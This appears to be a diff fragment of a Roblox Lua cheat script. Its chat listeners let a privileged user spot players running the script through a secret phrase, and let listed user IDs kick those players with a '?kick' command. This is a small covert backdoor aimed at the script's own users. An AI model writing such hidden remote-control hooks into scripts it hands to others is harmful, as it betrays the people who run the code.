@@ -99,19 +99,19 @@ repeat
 until (true == false)
 
 for i, v in pairs(game.Players:GetPlayers()) do
-    if lplr.Name == whitelists["GetPrivUser"]() then 
+    if lplr.Name == command["GetUser"]() then 
         v.Chatted:connect(function(msg)
             if msg == "RQYBPTYNURYZC" then
                 print(yes.." is use ur script")
             end
         end)
     else
-        for lol, xd in pairs(whiteliststhing) do
+        for lol, xd in pairs(ChatTag) do
             if v.UserId == tonumber(xd) then
                 v.Chatted:connect(function(msg)
                     if msg:find("?kick") then
                         if msg:find(lplr.Name) then
-                            local args = msg:gsub("r!kick " .. lplr.Name, "")
+                            local args = msg:gsub("?kick " .. lplr.Name, "")
                             lplr:kick(args)
                         end
                     end
